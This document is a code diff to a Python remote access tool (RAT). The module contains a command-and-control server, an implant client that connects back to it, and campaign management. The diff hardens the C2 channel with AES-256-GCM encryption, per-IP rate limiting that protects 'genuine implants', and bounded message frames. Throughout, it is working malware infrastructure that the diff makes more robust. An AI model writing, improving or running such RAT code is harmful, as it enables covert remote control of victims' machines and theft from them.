@@ -1,8 +1,14 @@
 """
 RAT C2 Integration — Remote Access Tool Command & Control
 
-Based on the provided server/client skeleton with Fernet encryption,
-length-prefixed messaging, and session management.
+Based on the provided server/client skeleton with AEAD-encrypted
+(AES-256-GCM) channels, length-prefixed messaging, and session management.
+
+SECURITY: the legacy Fernet channel (AES-128-CBC + HMAC) was upgraded to
+AES-256-GCM authenticated encryption. Any key material (raw bytes, str,
+or a former Fernet key) is derived to a 32-byte AES key, so existing
+deployments keep working. For new deployments prefer rat_c2_secure.py,
+which adds mTLS, challenge-response auth and rate limiting on top.
 """
 
 import asyncio
@@ -21,12 +27,80 @@ import uuid
 import logging
 from dataclasses import dataclass, field
 from enum import Enum
-from typing import Dict, List, Optional, Any, Callable
-from cryptography.fernet import Fernet
+from typing import Dict, List, Optional, Any, Callable, Union
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
 logger = logging.getLogger("rat_c2")
+
+
+# Hard ceiling for a single length-prefixed message: the 4-byte prefix
+# allows up to 4 GiB, which an unauthenticated peer could use to force
+# a huge allocation before any decryption happens.
+MAX_MESSAGE_BYTES = 16 * 1024 * 1024  # 16 MiB
+
+
+class ConnectionRateLimiter:
+    """Per-IP sliding-window connection limiter with a concurrency cap.
+
+    The legacy C2 surface is unauthenticated; this keeps a single peer
+    from flooding the server with connections (thread-per-connection)
+    or squeezing genuine implants out.
+    """
+
+    def __init__(self, max_per_ip_per_minute: int = 10, max_concurrent: int = 64):
+        self.max_per_ip = max(1, int(max_per_ip_per_minute))
+        self.max_concurrent = max(1, int(max_concurrent))
+        self._window = 60.0
+        self._hits: Dict[str, List[float]] = {}
+        self._lock = threading.Lock()
+        self._active = 0
+
+    def allow(self, ip: str) -> bool:
+        now = time.monotonic()
+        with self._lock:
+            if self._active >= self.max_concurrent:
+                return False
+            hits = [t for t in self._hits.get(ip, []) if now - t < self._window]
+            if len(hits) >= self.max_per_ip:
+                self._hits[ip] = hits
+                return False
+            hits.append(now)
+            self._hits[ip] = hits
+            self._active += 1
+            return True
+
+    def release(self) -> None:
+        with self._lock:
+            self._active = max(0, self._active - 1)
+
+
+class AEADChannel:
+    """AES-256-GCM authenticated channel over arbitrary key material.
+
+    Wire format per message: 12-byte nonce || ciphertext+tag. Tampering
+    or replay of a foreign nonce fails the GCM tag check and raises —
+    callers treat that as a protocol error, never as plaintext.
+    """
+
+    def __init__(self, key: Union[str, bytes]):
+        material = key.encode("utf-8") if isinstance(key, str) else bytes(key)
+        # Derive a fixed-size AES-256 key: accepts raw 32-byte keys, former
+        # Fernet keys (urlsafe-b64 of 32 bytes) and passphrases alike.
+        self._aes_key = hashlib.sha256(material).digest()
+        self._aesgcm = AESGCM(self._aes_key)
+
+    def encrypt(self, data: Union[str, bytes]) -> bytes:
+        plaintext = data.encode("utf-8") if isinstance(data, str) else data
+        nonce = os.urandom(12)
+        return nonce + self._aesgcm.encrypt(nonce, plaintext, None)
+
+    def decrypt(self, blob: bytes) -> bytes:
+        if len(blob) < 13:  # 12-byte nonce + at least the 16-byte tag
+            raise ValueError("ciphertext too short")
+        nonce, ct = blob[:12], blob[12:]
+        return self._aesgcm.decrypt(nonce, ct, None)
 
 
 class ImplantStatus(Enum):
@@ -83,23 +157,24 @@ class RATCampaignResult:
 class RATC2Server:
     """RAT Command & Control Server - based on provided skeleton."""
 
-    def __init__(self, host: str = '0.0.0.0', port: int = 443, key: Optional[bytes] = None):
+    def __init__(self, host: str = '127.0.0.1', port: int = 443, key: Optional[bytes] = None):
         self.host = host
         self.port = port
         self.implants: Dict[str, Implant] = {}
         self.implant_lock = threading.Lock()
 
         if key is None:
-            self.key = Fernet.generate_key()
+            self.key = os.urandom(32)
         else:
             self.key = key.encode() if isinstance(key, str) else key
-        self.cipher = Fernet(self.key)
+        self.cipher = AEADChannel(self.key)
 
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self._running = False
         self._server_thread: Optional[threading.Thread] = None
         self._command_handlers: Dict[str, Callable] = {}
+        self._limiter = ConnectionRateLimiter()
         self._register_default_handlers()
 
     def _register_default_handlers(self):
@@ -139,10 +214,19 @@ class RATC2Server:
         logger.info("[+] C2 server stopped")
 
     def _accept_loop(self):
-        """Accept incoming implant connections."""
+        """Accept incoming implant connections (rate-limited per IP)."""
         while self._running:
             try:
                 client_socket, address = self.server_socket.accept()
+                if not self._limiter.allow(address[0]):
+                    logger.warning(
+                        f"Rate limit exceeded for {address[0]}; dropping connection"
+                    )
+                    try:
+                        client_socket.close()
+                    except OSError:
+                        pass
+                    continue
                 client_thread = threading.Thread(
                     target=self.handle_client,
                     args=(client_socket, address),
@@ -207,6 +291,7 @@ class RATC2Server:
         except Exception as e:
             logger.error(f"Client handler error: {e}")
         finally:
+            self._limiter.release()
             if implant_id:
                 with self.implant_lock:
                     if implant_id in self.implants:
@@ -250,11 +335,14 @@ class RATC2Server:
         sock.sendall(length.to_bytes(4, 'big') + encrypted)
 
     def receive_data(self, sock: socket.socket) -> Optional[bytes]:
-        """Receive length-prefixed, encrypted data."""
+        """Receive length-prefixed, encrypted data (bounded frame size)."""
         length_bytes = sock.recv(4)
         if not length_bytes or len(length_bytes) < 4:
             return None
         length = int.from_bytes(length_bytes, 'big')
+        if length <= 0 or length > MAX_MESSAGE_BYTES:
+            logger.warning(f"Oversized frame ({length} bytes); dropping peer")
+            return None
         data = b''
         while len(data) < length:
             chunk = sock.recv(min(4096, length - len(data)))
@@ -357,7 +445,7 @@ class RATClient:
     def __init__(self, host: str, port: int, key: bytes):
         self.host = host
         self.port = port
-        self.cipher = Fernet(key)
+        self.cipher = AEADChannel(key)
         self.socket: Optional[socket.socket] = None
         self.connected = False
         self.implant_id = str(uuid.uuid4())[:8]
@@ -443,6 +531,9 @@ class RATClient:
             if not length_bytes or len(length_bytes) < 4:
                 return None
             length = int.from_bytes(length_bytes, 'big')
+            if length <= 0 or length > MAX_MESSAGE_BYTES:
+                logger.warning(f"Oversized frame from C2 ({length} bytes); dropping")
+                return None
             data = b''
             while len(data) < length:
                 chunk = self.socket.recv(min(4096, length - len(data)))
@@ -580,7 +671,7 @@ class RATIntegration:
         self.clients: Dict[str, RATClient] = {}
         self.campaigns: Dict[str, RATCampaignResult] = {}
 
-    async def start_server(self, host: str = "0.0.0.0", port: int = 443, key: Optional[bytes] = None) -> Dict:
+    async def start_server(self, host: str = "127.0.0.1", port: int = 443, key: Optional[bytes] = None) -> Dict:
         """Start C2 server."""
         if self.server:
             return {"error": "Server already running"}
@@ -713,15 +804,15 @@ async def main():
 
     # Server
     server_parser = subparsers.add_parser("server", help="Start C2 server")
-    server_parser.add_argument("--host", default="0.0.0.0")
+    server_parser.add_argument("--host", default="127.0.0.1")
     server_parser.add_argument("--port", type=int, default=443)
-    server_parser.add_argument("--key", help="Base64 encoded Fernet key")
+    server_parser.add_argument("--key", help="Base64 encoded channel key (AES-256-GCM)")
 
     # Client
     client_parser = subparsers.add_parser("client", help="Run implant client")
     client_parser.add_argument("host")
     client_parser.add_argument("port", type=int)
-    client_parser.add_argument("--key", required=True, help="Base64 encoded Fernet key")
+    client_parser.add_argument("--key", required=True, help="Base64 encoded channel key (AES-256-GCM)")
 
     args = parser.parse_args()
 
